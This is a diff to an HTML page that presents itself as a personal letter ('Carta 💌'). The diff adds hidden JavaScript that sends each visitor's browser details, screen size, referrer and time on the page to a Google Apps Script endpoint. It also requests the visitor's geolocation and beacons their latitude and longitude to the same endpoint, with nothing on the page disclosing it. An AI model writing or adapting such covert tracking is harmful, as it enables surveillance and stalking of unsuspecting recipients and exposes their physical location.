@@ -3,12 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <title>Carta 💌</title>
 
- <link rel="icon" type="image/png" href="favicon.png">
-
-
+  <link rel="icon" type="image/png" href="favicon.png">
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display&family=Great+Vibes&display=swap" rel="stylesheet">
 </head>
@@ -42,30 +39,45 @@
     if (sessionStorage.getItem("visitado")) return;
     sessionStorage.setItem("visitado", "true");
 
+    const url = "https://script.google.com/macros/s/AKfycbzfY1lH1syGPhSDmj4VwSSIaxx_l3AKOw3XBZ6HRu5r2cHLT2sOXqVe5ek3Wo80SBiv/exec";
+
+    const inicio = Date.now();
+    const origem = document.referrer || "direto";
+
+    // Dados iniciais
     const data = {
       ua: navigator.userAgent,
       os: navigator.platform,
       screen: screen.width + "x" + screen.height,
       lang: navigator.language,
-      url: location.href
+      url: location.href,
+      origem: origem
     };
 
+    // Envia dados iniciais
     const params = new URLSearchParams(data).toString();
+    fetch(url + "?" + params).catch(() => {});
 
-    fetch("https://script.google.com/macros/s/AKfycbzfY1lH1syGPhSDmj4VwSSIaxx_l3AKOw3XBZ6HRu5r2cHLT2sOXqVe5ek3Wo80SBiv/exec?" + params)
-      .catch(function(){});
+    // Tempo de permanência
+    window.addEventListener('beforeunload', () => {
+      let tempo = Date.now() - inicio; // em ms
+      navigator.sendBeacon(url + `?tempo=${tempo}&origem=${origem}`);
+    });
+
+    // Localização
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        let lat = pos.coords.latitude;
+        let lon = pos.coords.longitude;
+        navigator.sendBeacon(url + `?local=${lat},${lon}&origem=${origem}`);
+      },
+      (err) => {
+        navigator.sendBeacon(url + `?local=desconhecido&origem=${origem}`);
+      }
+    );
+
   })();
   </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
